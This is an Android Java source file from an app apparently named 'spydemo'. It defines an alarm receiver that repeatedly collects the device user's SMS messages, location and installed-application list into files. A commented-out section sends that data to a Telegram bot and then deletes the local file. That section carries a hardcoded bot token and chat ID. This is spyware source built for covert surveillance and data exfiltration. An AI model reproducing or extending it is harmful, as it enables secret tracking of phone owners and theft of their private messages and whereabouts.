package com.spy.spydemo;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.SystemClock;
import android.util.Log;
import android.widget.Toast;

import org.telegram.telegrambots.meta.api.objects.Message;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.io.File;

public class Alarm extends BroadcastReceiver {
    public static void set(Context context) {
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, Alarm.class);
        PendingIntent pIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
        am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime(), 30 * 60 , pIntent);
        Log.i("Alarm is set", "Start");
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        UserSMS sms = new UserSMS(context);
        sms.saveSMS();

        UserLocation location = new UserLocation(context);
        location.saveLocationToFile();

        UserApplications applications = new UserApplications(context);
        applications.saveToFile();
//
//        TelegramAPI telegramApi = new TelegramAPI("1382023725:AAEXNWrvY63unLDhuBNZosioHXwcZ5Nf9i4", "172332001" );
//        try {
//            Log.i("Send prog list", "Start");
//            Message message = telegramApi.sendDocUploadingAFile(new File(applications.path), "apps");
//            if (message != null){
//                File file = new File(applications.path);
//                file.delete();
//                Log.i("Send prog list", "End");
//            }
//        } catch (TelegramApiException e) {
//            e.printStackTrace();
//        }
    }
}
